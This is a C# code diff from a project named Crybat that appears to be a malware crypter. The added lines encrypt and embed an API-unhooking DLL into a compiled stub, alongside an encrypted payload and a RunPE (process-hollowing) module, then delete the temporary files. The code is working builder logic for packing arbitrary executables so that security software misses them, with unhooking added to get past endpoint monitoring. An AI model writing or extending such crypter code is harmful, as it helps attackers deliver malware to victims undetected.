@@ -116,6 +116,8 @@ namespace Crybat
             listBox2.Items.Add("Building stub...");
             string tempfile = Path.GetTempFileName();
             File.WriteAllBytes("payload.exe", payload_enc);
+            byte[] unhookerdll_enc = Encrypt(mode, Compress(GetEmbeddedResource("Jlaive.Resources.apiunhooker.dll")), _stubkey, _stubiv);
+            File.WriteAllBytes("apiunhooker.dll", unhookerdll_enc);
             if (!isnetasm)
             {
                 byte[] runpedll_enc = Encrypt(mode, Compress(GetEmbeddedResource("Crybat.Resources.runpe.dll")), _stubkey, _stubiv);
@@ -129,6 +131,7 @@ namespace Crybat
                 IncludeDebugInformation = false
             };
             parameters.EmbeddedResources.Add("payload.exe");
+            parameters.EmbeddedResources.Add("apiunhooker.dll");
             if (!isnetasm) parameters.EmbeddedResources.Add("runpe.dll");
             foreach (string item in listBox1.Items) parameters.EmbeddedResources.Add(item);
             CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
@@ -145,6 +148,7 @@ namespace Crybat
             }
             byte[] stubbytes = File.ReadAllBytes(tempfile);
             File.Delete("payload.exe");
+            File.Delete("apiunhooker.dll");
             if (!isnetasm) File.Delete("runpe.dll");
             File.Delete(tempfile);
 
